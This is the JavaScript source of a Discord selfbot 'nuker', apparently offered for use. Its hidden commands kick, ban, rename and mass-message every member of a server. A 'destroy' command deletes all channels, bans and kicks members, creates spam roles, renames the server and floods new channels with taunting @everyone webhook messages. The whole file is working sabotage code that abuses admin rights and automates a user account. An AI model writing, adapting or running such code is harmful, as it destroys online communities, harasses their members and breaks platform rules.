const { Client } = require('discord.js-selfbot-v13');
const { prefix, token } = require('./config');
const chalk = require('chalk');
const figlet = require("figlet");

const client = new Client();

client.on('ready', () => {
  figlet('ROCK ON TOP', (err, data) => {
    if (err) {
      console.log('Error:', err);
      return;
    }
    console.log(chalk.yellow(data));
  });
});

client.on('guildCreate', guild => {
  console.log(`Joining ${guild.name}`);
});

client.on('messageCreate', async message => {
  if (message.author.bot || !message.content.startsWith(prefix)) return;

  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'secret') {
    await message.delete();
    const helpMessage = `
**Secret Commands**
\`kall\`: Kicks every member in a server
\`ball\`: Bans every member in a server
\`rall <new_name>\`: Renames every member in a server
\`mall\`: Messages every member in a server
\`destroy\`: Deletes channels, remakes new ones, deletes roles, bans members, and wipes emojis. In that order
\`ping\`: Gives ping to client (expressed in MS)
\`info [@user]\`: Gives information of a user
    `;
    await message.channel.send(helpMessage);
  }

  if (command === 'kall') {
    await message.delete();
    const guild = message.guild;
    guild.members.cache.forEach(async member => {
      try {
        await member.kick();
        console.log(`${member.user.tag} has been kicked`);
      } catch {
        console.log(`${member.user.tag} has FAILED to be kicked`);
      }
    });
    console.log('Action completed: Kick all');
  }

  if (command === 'ball') {
    await message.delete();
    const guild = message.guild;
    guild.members.cache.forEach(async member => {
      try {
        await member.ban();
        console.log(`${member.user.tag} has been banned`);
      } catch {}
    });
    console.log('Action completed: Ban all');
  }

  if (command === 'rall') {
    await message.delete();
    const renameTo = args.join(' ');
    message.guild.members.cache.forEach(async member => {
      try {
        await member.setNickname(renameTo);
        console.log(`${member.user.tag} has been renamed to ${renameTo}`);
      } catch {
        console.log(`${member.user.tag} has NOT been renamed`);
      }
    });
    console.log('Action completed: Rename all');
  }

  if (command === 'mall') {
    await message.delete();
    const messageContent = `
This Is Why You Don't Wanna Give Random People Admin!
They Nuke Your Server With A Free Source Code (Check GitHub for the code)

GitHub: https://github.com/devrock07

Nuked By Your Dad Bot! Sorry About Your Loss
    `;
    message.guild.members.cache.forEach(async member => {
      try {
        await member.send(messageContent);
      } catch {}
    });
    console.log('Action completed: Message all');
  }

  if (command === 'ping') {
    await message.delete();
    const start = Date.now();
    await message.channel.sendTyping();
    const diff = Date.now() - start;
    await message.channel.send(`Ping: ${diff}ms`);
    console.log('Action completed: Server ping');
  }

  if (command === 'info') {
    await message.delete();
    const member = message.mentions.members.first() || message.member;
    const infoMessage = `
**${member.user.tag}'s Information**
ID: ${member.id}
Status: ${member.presence?.status || 'offline'}
Highest Role: ${member.roles.highest.name}
Joined At: ${member.joinedAt.toDateString()}
    `;
    await message.channel.send(infoMessage);
    console.log('Action completed: User Info');
  }

  if (command === 'destroy') {
    await message.delete();

    // Delete all channels except category channels
    message.guild.channels.cache.forEach(async channel => {
      if (channel.type !== 'GUILD_CATEGORY') {
        try {
          await channel.delete();
          console.log(`${channel.name} has been deleted`);
        } catch (error) {
          console.error(`Failed to delete channel ${channel.name}:`, error);
        }
      }
    });

    // Ban all members
    message.guild.members.cache.forEach(async member => {
      try {
        await member.ban();
        console.log(`${member.user.tag} has been banned`);
      } catch (error) {
        console.error(`Failed to ban member ${member.user.tag}:`, error);
      }
    });

    // Kick all members
    message.guild.members.cache.forEach(async member => {
      try {
        await member.kick();
        console.log(`${member.user.tag} has been kicked`);
      } catch (error) {
        console.error(`Failed to kick member ${member.user.tag}:`, error);
      }
    });

    // Create mass roles
    const numRoles = 10;
    for (let i = 0; i < numRoles; i++) {
      try {
        await message.guild.roles.create({
          name: `rockontop${i + 1}`,
          color: 'RANDOM'
        });
        console.log(`Role rockontop${i + 1} has been created`);
      } catch (error) {
        console.error(`Failed to create role rockontop${i + 1}:`, error);
      }
    }

    // Rename the server to "rock on top"
    try {
      await message.guild.setName('rock on top');
      console.log('Server renamed to "rock on top"');
    } catch (error) {
      console.error('Failed to rename server:', error);
    }

    // Create new channels
    const numChannels = 10;
    const channelMessages = [
      "This server got nuked!",
      "Oops! Your server is gone!",
      "You should be more careful next time!",
      "Nuked by your dad's bot!",
      "Better luck next time!",
      "GG! Server destroyed!",
      "Hacked by a pro!",
      "Security breach!",
      "All your base are belong to us!",
      "Game over, server nuked!"
    ];

    for (let i = 0; i < numChannels; i++) {
      try {
        const newChannel = await message.guild.channels.create(`nuked-by-rock-${i + 1}`, { type: 'GUILD_TEXT' });
        const webhook = await newChannel.createWebhook('Rock Webhook');
        for (let j = 0; j < channelMessages.length; j++) {
          await webhook.send({ content: `@everyone ${channelMessages[j]}` });
        }
        console.log(`Channel nuked-by-rock-${i + 1} and messages sent`);
      } catch (error) {
        console.error(`Failed to create/send message to channel ${i + 1}:`, error);
      }
    }

    console.log('Action completed: Nuclear Destruction');
  }
});

client.login(token);
